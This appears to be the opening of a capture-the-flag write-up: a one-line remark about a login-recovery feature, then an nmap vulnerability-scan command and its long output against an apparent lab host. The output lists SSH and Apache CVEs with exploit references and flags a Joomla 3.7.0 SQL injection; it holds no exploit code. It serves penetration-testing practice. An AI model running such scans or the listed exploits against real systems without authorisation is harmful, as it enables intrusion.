on the website I notice a forgot your username and password feature

INCOMING NMAP SCAN

┌──(kali㉿kali)-[~]
└─$ nmap -A -T4 --script vuln -p- -oN initial.nmap 10.10.132.218
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 20:19 EDT
Nmap scan report for 10.10.132.218
Host is up (0.095s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.4: 
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    9.8     https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0  *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587  *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    7.5     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       F79E574D-30C8-5C52-A801-66FFA0610BAA    6.8     https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA  *EXPLOIT*
|       EDB-ID:46516    6.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    6.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       CVE-2019-6110   6.8     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   6.8     https://vulners.com/cve/CVE-2019-6109
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       PACKETSTORM:181223      5.9     https://vulners.com/packetstorm/PACKETSTORM:181223      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        5.9     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6111   5.9     https://vulners.com/cve/CVE-2019-6111
|       54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    5.9     https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C  *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       EDB-ID:45939    5.3     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.3     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-20685  5.3     https://vulners.com/cve/CVE-2018-20685
|       CVE-2018-15919  5.3     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.3     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.3     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-vuln-cve2017-8917: 
|   VULNERABLE:
|   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-8917
|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
|       to execute aribitrary SQL commands via unspecified vectors.
|       
|     Disclosure date: 2017-05-17
|     Extra information:
|       User: root@localhost
|     References:
|       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-dombased-xss: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.132.218
|   Found the following indications of potential DOM based XSS: 
|     
|     Source: window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no')
|_    Pages: http://10.10.132.218:80/, http://10.10.132.218:80/index.php, http://10.10.132.218:80/index.php/2-uncategorised, http://10.10.132.218:80/index.php/2-uncategorised/1-spider-man-robs-bank
|_http-trace: TRACE is enabled
| vulners: 
|   cpe:/a:apache:http_server:2.4.6: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-      *EXPLOIT*
|       F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5    9.8     https://vulners.com/githubexploit/F9C0CD4B-3B60-5720-AE7A-7CC31DB839C5  *EXPLOIT*
|       F607361B-6369-5DF5-9B29-E90FA29DC565    9.8     https://vulners.com/githubexploit/F607361B-6369-5DF5-9B29-E90FA29DC565  *EXPLOIT*
|       F41EE867-4E63-5259-9DF0-745881884D04    9.8     https://vulners.com/githubexploit/F41EE867-4E63-5259-9DF0-745881884D04  *EXPLOIT*
|       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       EDB-ID:50512    9.8     https://vulners.com/exploitdb/EDB-ID:50512      *EXPLOIT*
|       EDB-ID:50446    9.8     https://vulners.com/exploitdb/EDB-ID:50446      *EXPLOIT*
|       EDB-ID:50406    9.8     https://vulners.com/exploitdb/EDB-ID:50406      *EXPLOIT*
|       E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6    9.8     https://vulners.com/githubexploit/E796A40A-8A8E-59D1-93FB-78EF4D8B7FA6  *EXPLOIT*
|       D10426F3-DF82-5439-AC3E-6CA0A1365A09    9.8     https://vulners.com/githubexploit/D10426F3-DF82-5439-AC3E-6CA0A1365A09  *EXPLOIT*
|       D0368327-F989-5557-A5C6-0D9ACDB4E72F    9.8     https://vulners.com/githubexploit/D0368327-F989-5557-A5C6-0D9ACDB4E72F  *EXPLOIT*
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-42013  9.8     https://vulners.com/cve/CVE-2021-42013
|       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  9.8     https://vulners.com/cve/CVE-2021-26691
|       CVE-2018-1312   9.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-7679   9.8     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   9.8     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   9.8     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
|       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
|       CC15AE65-B697-525A-AF4B-38B1501CAB49    9.8     https://vulners.com/githubexploit/CC15AE65-B697-525A-AF4B-38B1501CAB49  *EXPLOIT*
|       C879EE66-6B75-5EC8-AA68-08693C6CCAD1    9.8     https://vulners.com/githubexploit/C879EE66-6B75-5EC8-AA68-08693C6CCAD1  *EXPLOIT*
|       C5A61CC6-919E-58B4-8FBB-0198654A7FC8    9.8     https://vulners.com/githubexploit/C5A61CC6-919E-58B4-8FBB-0198654A7FC8  *EXPLOIT*
|       BF9B0898-784E-5B5E-9505-430B58C1E6B8    9.8     https://vulners.com/githubexploit/BF9B0898-784E-5B5E-9505-430B58C1E6B8  *EXPLOIT*
|       B02819DB-1481-56C4-BD09-6B4574297109    9.8     https://vulners.com/githubexploit/B02819DB-1481-56C4-BD09-6B4574297109  *EXPLOIT*
|       ACD5A7F2-FDB2-5859-8D23-3266A1AF6795    9.8     https://vulners.com/githubexploit/ACD5A7F2-FDB2-5859-8D23-3266A1AF6795  *EXPLOIT*
|       A90ABEAD-13A8-5F09-8A19-6D9D2D804F05    9.8     https://vulners.com/githubexploit/A90ABEAD-13A8-5F09-8A19-6D9D2D804F05  *EXPLOIT*
|       A8616E5E-04F8-56D8-ACB4-32FDF7F66EED    9.8     https://vulners.com/githubexploit/A8616E5E-04F8-56D8-ACB4-32FDF7F66EED  *EXPLOIT*
|       A5425A79-9D81-513A-9CC5-549D6321897C    9.8     https://vulners.com/githubexploit/A5425A79-9D81-513A-9CC5-549D6321897C  *EXPLOIT*
|       A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A    9.8     https://vulners.com/githubexploit/A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A  *EXPLOIT*
|       9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5    9.8     https://vulners.com/githubexploit/9B4F4E4A-CFDF-5847-805F-C0BAE809DBD5  *EXPLOIT*
|       907F28D0-5906-51C7-BAA3-FEBD5E878801    9.8     https://vulners.com/githubexploit/907F28D0-5906-51C7-BAA3-FEBD5E878801  *EXPLOIT*
|       8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677    9.8     https://vulners.com/githubexploit/8A57FAF6-FC91-52D1-84E0-4CBBAD3F9677  *EXPLOIT*
|       88EB009A-EEFF-52B7-811D-A8A8C8DE8C81    9.8     https://vulners.com/githubexploit/88EB009A-EEFF-52B7-811D-A8A8C8DE8C81  *EXPLOIT*
|       8713FD59-264B-5FD7-8429-3251AB5AB3B8    9.8     https://vulners.com/githubexploit/8713FD59-264B-5FD7-8429-3251AB5AB3B8  *EXPLOIT*
|       866E26E3-759B-526D-ABB5-206B2A1AC3EE    9.8     https://vulners.com/githubexploit/866E26E3-759B-526D-ABB5-206B2A1AC3EE  *EXPLOIT*
|       86360765-0B1A-5D73-A805-BAE8F1B5D16D    9.8     https://vulners.com/githubexploit/86360765-0B1A-5D73-A805-BAE8F1B5D16D  *EXPLOIT*
|       831E1114-13D1-54EF-BDE4-F655114CDC29    9.8     https://vulners.com/githubexploit/831E1114-13D1-54EF-BDE4-F655114CDC29  *EXPLOIT*
|       805E6B24-8DF9-51D8-8DF6-6658161F96EA    9.8     https://vulners.com/githubexploit/805E6B24-8DF9-51D8-8DF6-6658161F96EA  *EXPLOIT*
|       7E615961-3792-5896-94FA-1F9D494ACB36    9.8     https://vulners.com/githubexploit/7E615961-3792-5896-94FA-1F9D494ACB36  *EXPLOIT*
|       78787F63-0356-51EC-B32A-B9BD114431C3    9.8     https://vulners.com/githubexploit/78787F63-0356-51EC-B32A-B9BD114431C3  *EXPLOIT*
|       6CAA7558-723B-5286-9840-4DF4EB48E0AF    9.8     https://vulners.com/githubexploit/6CAA7558-723B-5286-9840-4DF4EB48E0AF  *EXPLOIT*
|       6A0A657E-8300-5312-99CE-E11F460B1DBF    9.8     https://vulners.com/githubexploit/6A0A657E-8300-5312-99CE-E11F460B1DBF  *EXPLOIT*
|       64D31BF1-F977-51EC-AB1C-6693CA6B58F3    9.8     https://vulners.com/githubexploit/64D31BF1-F977-51EC-AB1C-6693CA6B58F3  *EXPLOIT*
|       61075B23-F713-537A-9B84-7EB9B96CF228    9.8     https://vulners.com/githubexploit/61075B23-F713-537A-9B84-7EB9B96CF228  *EXPLOIT*
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
|       5312D04F-9490-5472-84FA-86B3BBDC8928    9.8     https://vulners.com/githubexploit/5312D04F-9490-5472-84FA-86B3BBDC8928  *EXPLOIT*
|       52E13088-9643-5E81-B0A0-B7478BCF1F2C    9.8     https://vulners.com/githubexploit/52E13088-9643-5E81-B0A0-B7478BCF1F2C  *EXPLOIT*
|       50453CEF-5DCF-511A-ADAC-FB74994CD682    9.8     https://vulners.com/githubexploit/50453CEF-5DCF-511A-ADAC-FB74994CD682  *EXPLOIT*
|       495E99E5-C1B0-52C1-9218-384D04161BE4    9.8     https://vulners.com/githubexploit/495E99E5-C1B0-52C1-9218-384D04161BE4  *EXPLOIT*
|       44E43BB7-6255-58E7-99C7-C3B84645D497    9.8     https://vulners.com/githubexploit/44E43BB7-6255-58E7-99C7-C3B84645D497  *EXPLOIT*
|       40F21EB4-9EE8-5ED1-B561-0A2B8625EED3    9.8     https://vulners.com/githubexploit/40F21EB4-9EE8-5ED1-B561-0A2B8625EED3  *EXPLOIT*
|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
|       37634050-FDDF-571A-90BB-C8109824B38D    9.8     https://vulners.com/githubexploit/37634050-FDDF-571A-90BB-C8109824B38D  *EXPLOIT*
|       30293CDA-FDB1-5FAF-9622-88427267F204    9.8     https://vulners.com/githubexploit/30293CDA-FDB1-5FAF-9622-88427267F204  *EXPLOIT*
|       2B3110E1-BEA0-5DB8-93AD-1682230F3E19    9.8     https://vulners.com/githubexploit/2B3110E1-BEA0-5DB8-93AD-1682230F3E19  *EXPLOIT*
|       22DCCD26-B68C-5905-BAC2-71D10DE3F123    9.8     https://vulners.com/githubexploit/22DCCD26-B68C-5905-BAC2-71D10DE3F123  *EXPLOIT*
|       2108729F-1E99-54EF-9A4B-47299FD89FF2    9.8     https://vulners.com/githubexploit/2108729F-1E99-54EF-9A4B-47299FD89FF2  *EXPLOIT*
|       1C39E10A-4A38-5228-8334-2A5F8AAB7FC3    9.8     https://vulners.com/githubexploit/1C39E10A-4A38-5228-8334-2A5F8AAB7FC3  *EXPLOIT*
|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
|       1337DAY-ID-37777        9.8     https://vulners.com/zdt/1337DAY-ID-37777        *EXPLOIT*
|       1337DAY-ID-36952        9.8     https://vulners.com/zdt/1337DAY-ID-36952        *EXPLOIT*
|       11813536-2AFF-5EA4-B09F-E9EB340DDD26    9.8     https://vulners.com/githubexploit/11813536-2AFF-5EA4-B09F-E9EB340DDD26  *EXPLOIT*
|       0C47BCF2-EA6F-5613-A6E8-B707D64155DE    9.8     https://vulners.com/githubexploit/0C47BCF2-EA6F-5613-A6E8-B707D64155DE  *EXPLOIT*
|       0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56    9.8     https://vulners.com/githubexploit/0AA6A425-25B1-5D2A-ABA1-2933D3E1DC56  *EXPLOIT*
|       07AA70EA-C34E-5F66-9510-7C265093992A    9.8     https://vulners.com/githubexploit/07AA70EA-C34E-5F66-9510-7C265093992A  *EXPLOIT*
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
|       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
|       CVE-2017-9788   9.1     https://vulners.com/cve/CVE-2017-9788
|       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
|       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
|       2EF14600-503F-53AF-BA24-683481265D30    9.1     https://vulners.com/githubexploit/2EF14600-503F-53AF-BA24-683481265D30  *EXPLOIT*
|       0486EBEE-F207-570A-9AD8-33269E72220A    9.1     https://vulners.com/githubexploit/0486EBEE-F207-570A-9AD8-33269E72220A  *EXPLOIT*
|       DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6    9.0     https://vulners.com/githubexploit/DC06B9EF-3584-5D80-9EEB-E7B637DCF3D6  *EXPLOIT*
|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
|       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
|       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
|       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C  *EXPLOIT*
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       893DFD44-40B5-5469-AC54-A373AEE17F19    9.0     https://vulners.com/githubexploit/893DFD44-40B5-5469-AC54-A373AEE17F19  *EXPLOIT*
|       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    9.0     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    9.0     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F  *EXPLOIT*
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       CVE-2017-15715  8.1     https://vulners.com/cve/CVE-2017-15715
|       CVE-2016-5387   8.1     https://vulners.com/cve/CVE-2016-5387
|       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
|       PACKETSTORM:181038      7.5     https://vulners.com/packetstorm/PACKETSTORM:181038      *EXPLOIT*
|       PACKETSTORM:176334      7.5     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       PACKETSTORM:164941      7.5     https://vulners.com/packetstorm/PACKETSTORM:164941      *EXPLOIT*
|       PACKETSTORM:164629      7.5     https://vulners.com/packetstorm/PACKETSTORM:164629      *EXPLOIT*
|       PACKETSTORM:164609      7.5     https://vulners.com/packetstorm/PACKETSTORM:164609      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED- 7.5     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED-  *EXPLOIT*
|       FF610CB4-801A-5D1D-9AC9-ADFC287C8482    7.5     https://vulners.com/githubexploit/FF610CB4-801A-5D1D-9AC9-ADFC287C8482  *EXPLOIT*
|       FDF4BBB1-979C-5320-95EA-9EC7EB064D72    7.5     https://vulners.com/githubexploit/FDF4BBB1-979C-5320-95EA-9EC7EB064D72  *EXPLOIT*
|       FCAF01A0-F921-5DB1-BBC5-850EC2DC5C46    7.5     https://vulners.com/githubexploit/FCAF01A0-F921-5DB1-BBC5-850EC2DC5C46  *EXPLOIT*
|       F8A7DE57-8F14-5B3C-A102-D546BDD8D2B8    7.5     https://vulners.com/githubexploit/F8A7DE57-8F14-5B3C-A102-D546BDD8D2B8  *EXPLOIT*
|       EDB-ID:50383    7.5     https://vulners.com/exploitdb/EDB-ID:50383      *EXPLOIT*
|       EDB-ID:42745    7.5     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       EDB-ID:40961    7.5     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT*
|       E81474F6-6DDC-5FC2-828A-812A8815E3B4    7.5     https://vulners.com/githubexploit/E81474F6-6DDC-5FC2-828A-812A8815E3B4  *EXPLOIT*
|       E7B177F6-FA62-52FE-A108-4B8FC8112B7F    7.5     https://vulners.com/githubexploit/E7B177F6-FA62-52FE-A108-4B8FC8112B7F  *EXPLOIT*
|       E6B39247-8016-5007-B505-699F05FCA1B5    7.5     https://vulners.com/githubexploit/E6B39247-8016-5007-B505-699F05FCA1B5  *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    7.5     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
|       E59A01BE-8176-5F5E-BD32-D30B009CDBDA    7.5     https://vulners.com/githubexploit/E59A01BE-8176-5F5E-BD32-D30B009CDBDA  *EXPLOIT*
|       E0EEEDE5-43B8-5608-B33E-75E65D2D8314    7.5     https://vulners.com/githubexploit/E0EEEDE5-43B8-5608-B33E-75E65D2D8314  *EXPLOIT*
|       E-739   7.5     https://vulners.com/dsquare/E-739       *EXPLOIT*
|       E-738   7.5     https://vulners.com/dsquare/E-738       *EXPLOIT*
|       DBF996C3-DC2A-5859-B767-6B2FC38F2185    7.5     https://vulners.com/githubexploit/DBF996C3-DC2A-5859-B767-6B2FC38F2185  *EXPLOIT*
|       D0E79214-C9E8-52BD-BC24-093970F5F34E    7.5     https://vulners.com/githubexploit/D0E79214-C9E8-52BD-BC24-093970F5F34E  *EXPLOIT*
|       CVE-2024-40898  7.5     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
|       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-30522  7.5     https://vulners.com/cve/CVE-2022-30522
|       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-41524  7.5     https://vulners.com/cve/CVE-2021-41524
|       CVE-2021-34798  7.5     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  7.5     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-31618  7.5     https://vulners.com/cve/CVE-2021-31618
|       CVE-2021-26690  7.5     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-13950  7.5     https://vulners.com/cve/CVE-2020-13950
|       CVE-2019-0217   7.5     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-0215   7.5     https://vulners.com/cve/CVE-2019-0215
|       CVE-2019-0190   7.5     https://vulners.com/cve/CVE-2019-0190
|       CVE-2018-8011   7.5     https://vulners.com/cve/CVE-2018-8011
|       CVE-2018-17199  7.5     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   7.5     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   7.5     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   7.5     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-9789   7.5     https://vulners.com/cve/CVE-2017-9789
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-7659   7.5     https://vulners.com/cve/CVE-2017-7659
|       CVE-2017-15710  7.5     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   7.5     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   7.5     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   7.5     https://vulners.com/cve/CVE-2016-0736
|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
|       CNVD-2022-53584 7.5     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-41639 7.5     https://vulners.com/cnvd/CNVD-2022-41639
|       CNVD-2022-03223 7.5     https://vulners.com/cnvd/CNVD-2022-03223
|       CF47F8BF-37F7-5EF9-ABAB-E88ECF6B64FE    7.5     https://vulners.com/githubexploit/CF47F8BF-37F7-5EF9-ABAB-E88ECF6B64FE  *EXPLOIT*
|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
|       CD48BD40-E52A-5A8B-AE27-B57C358BB0EE    7.5     https://vulners.com/githubexploit/CD48BD40-E52A-5A8B-AE27-B57C358BB0EE  *EXPLOIT*
|       C8C7BBD4-C089-5DA7-8474-A5B2B7DC5E79    7.5     https://vulners.com/githubexploit/C8C7BBD4-C089-5DA7-8474-A5B2B7DC5E79  *EXPLOIT*
|       C8799CA3-C88C-5B39-B291-2895BE0D9133    7.5     https://vulners.com/githubexploit/C8799CA3-C88C-5B39-B291-2895BE0D9133  *EXPLOIT*
